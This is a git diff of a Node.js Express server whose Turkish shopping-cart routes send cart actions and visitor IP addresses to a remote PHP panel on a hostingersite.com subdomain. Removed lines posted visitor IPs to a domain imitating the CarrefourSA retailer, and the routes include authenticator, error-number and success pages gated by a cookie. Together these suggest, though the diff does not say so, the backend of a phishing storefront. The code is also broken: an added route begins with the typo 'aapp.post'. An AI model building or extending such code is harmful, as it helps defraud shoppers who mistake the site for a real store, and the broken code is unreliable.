@@ -21,6 +21,15 @@ app.use(express.static(path.join(__dirname, 'public')));
 
  app.use(cors());
 
+const getClientIp = (req) => {
+  const forwarded = req.headers['x-forwarded-for'];
+  if (forwarded) {
+    return forwarded.split(',')[0].trim();
+  }
+  return req.connection.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
+};
+
+
 
 app.get('/', async (req, res) => {
   try {
@@ -99,19 +108,48 @@ app.post('/api/sepet/ekle', (req, res) => {
   });
 });
 
-app.post('/api/sepet/sil', (req, res) => {
-   const urun_id = req.body.urun_id;
-   const clientIp = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+aapp.post('/api/sepet/sil', (req, res) => {
+  const urun_id = req.body.urun_id;
+  const ip = getClientIp(req);
 
-   axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php?action=sepet_sil', {
+  axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php',
+    qs.stringify({
+      action: 'sepet_sil',
       urun_id,
-      ip: clientIp
-   }).then(response => {
-      res.json({ status: response.data });
-   }).catch(error => {
-      console.error(error);
-      res.json({ status: 'fail' });
-   });
+      ip
+    }), {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest'
+      }
+    }
+  ).then(response => {
+    res.json({ status: response.data.trim() });
+  }).catch(error => {
+    console.error(error);
+    res.json({ status: 'fail' });
+  });
+});
+
+app.post('/api/sepet/tumunu-sil', (req, res) => {
+  const ip = getClientIp(req);
+
+  axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php',
+    qs.stringify({
+      action: 'butunsepetsil',
+      ip
+    }), {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest'
+      }
+    }
+  ).then(response => {
+    res.json({ status: response.data.trim() });
+  }).catch(error => {
+    console.error(error);
+    res.json({ status: 'fail' });
+  });
 });
 
 
@@ -122,39 +160,8 @@ app.get('/authenticator', (req, res) => {
     }
     res.sendFile(path.join(__dirname, 'public', 'authenticator.html'));
    });
-  app.get('/error-number', (req, res) => {
-       const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'error-number.html'));
-  });
-app.get('/successfuly', (req, res) => {
-     const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-  res.sendFile(path.join(__dirname, 'public', 'basarili.html'));
-});
-  
-
  
-app.post('/api', async (req, res) => {
-  const clientIp = req.clientIp; // Ziyaretçinin IP adresi
-
-  try {
-    const response = await axios.post('http://3-carrefoursa.com', {
-      ip: clientIp
-    });
-
-    
-    res.send(response.data);
-  } catch (error) {
-    console.error("Hedef URL'ye POST gönderiminde hata:", error);
-    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
-  }
-});
-
+ 
  
 
   
